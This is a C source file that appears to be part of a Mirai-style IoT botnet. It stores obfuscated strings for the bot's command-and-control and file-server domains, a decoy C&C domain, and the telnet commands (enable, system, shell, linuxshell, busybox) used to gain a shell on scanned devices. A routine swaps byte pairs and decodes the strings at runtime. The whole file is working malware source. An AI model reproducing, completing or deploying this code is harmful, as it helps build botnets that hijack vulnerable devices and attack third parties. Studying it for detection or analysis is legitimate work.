#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <string.h>

#include "headers/entry.h"
#include "headers/utils.h"

static struct entry *start;
static char table[62] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

struct entry *retrieve_entry(uint8_t id)
{
	int i = 0;
	struct entry *ptr = start;
	char buf[DNS_TXT_MAX_SIZE];

	while(ptr)
	{
		if(ptr->id == id)
			break;
		ptr = ptr->next;
	}

	if(!ptr)
		return NULL;

	if(ptr->d)
		return ptr;

	for(i = 0; i < ptr->data_len; i++)
		buf[i] = ptr->val[i];

	for(i = 0; i < ptr->data_len; i += 2)
	{
		char tmp = buf[i];
		buf[i] = buf[i + 1];
		buf[i + 1] = tmp;
	}

	util_null(ptr->val, 0, ptr->data_len);
	decode(buf, ptr->buf, ptr->data_len);
	ptr->d = TRUE;

    ptr->data_len = util_strlen(ptr->buf);

	#ifdef DEBUG
	//printf("Retrieving \"%s\"...\n", ptr->buf);
	#endif

	return ptr;
}

void load_entry(uint8_t id, char *val, int len)
{
	struct entry *ptr = (struct entry *)malloc(sizeof(struct entry));
	ptr->id = id;
	ptr->next = start;
	ptr->data_len = len;
	ptr->val = (char *)malloc(len);
	util_memcpy(ptr->val, val, len);
	start = ptr;
	return;
}

void init_entrys(void)
{
	// t.ademaiasantos.club (this is literally not used by the bot...)
	load_entry(ENTRY_CNC_DOMAIN, "Cdh5GZtVWYhl2cuFGdz9mLsNWdAI", 28);
    // f.ademaiasantos.club
    load_entry(ENTRY_FILE_SERVER_DOMAIN, "iZh5GZtVWYhl2cuFGdz9mLsNWdAI", 28);
	// gosh that italian family at the next table sure is quiet
	load_entry(ENTRY_SUCCESS_STRING, "2Zz9Ca0BGa0FGI0lWYpxWYg4mZtFWa5xGI0FHIoRSZuBXZ0hHIhRmYlxHI1NmcgUXagMXcpVXZAQ", 76);
	// Embedded youtube link
	load_entry(ENTRY_YOUTUBE_LINK, "https://www.youtube.ru/watch?v=OGp9P6QvMjY", 42);
	// network.bigbotpein.com
	load_entry(ENTRY_FAKE_CNC_DOMAIN, "mb0V2dy9yai5Waid3bwRWZulmLvNQbAA", 32);
    #ifdef TSUNAMI_SCAN
    // /bin/busybox TSUNAMI
    load_entry(ENTRY_TELNET_QUERY, "2LpJibi9Xd5NmY49FITRUVB5UTAk", 28);
    // enable
    load_entry(ENTRY_TELNET_ENABLE, "WZh5mYlx", 8);
    // system
    load_entry(ENTRY_TELNET_SYSTEM, "3czlGdtV", 8);
    // shell
    load_entry(ENTRY_TELNET_SHELL, "2clhGbAw", 8);
    // sh
    load_entry(ENTRY_TELNET_SH, "2cAg", 4);
    // linuxshell
    load_entry(ENTRY_TELNET_LINUXSHELL, "GbulXdzhGasVAbAA", 16);
    #endif
    return;
}

void decode(char *src, char *dst, uint8_t len)
{
    int i = 0;
    int j = 0;
    uint32_t a = 0, b = 0, c = 0, d = 0;
    char buf[len / 4 * 3];
    uint32_t t = 0;
    char tmp[DNS_TXT_MAX_SIZE];

    for(i = 0; i < sizeof(table); i++)
        tmp[table[i]] = i;
    for(i = 0; i < len; i = i)
    {
        a = tmp[src[i++]];
        b = tmp[src[i++]];
        c = tmp[src[i++]];
        d = tmp[src[i++]];
        t = (a << 3 * 6) + (b << 2 * 6) + (c << 1 * 6) + (d << 0 * 6);
        buf[j++] = (t >> 2 * 8) & 0xFF;
        buf[j++] = (t >> 1 * 8) & 0xFF;
        buf[j++] = (t >> 0 * 8) & 0xFF;
    }
    // Copy the data to the destination buffer now
    for(i = 0; i < j; i++)
        dst[i] = buf[i];

    #ifdef DEBUG
    //printf("Deobfuscated data \"%s\", Length %d\n", dst, j);
    #endif

    return;
}
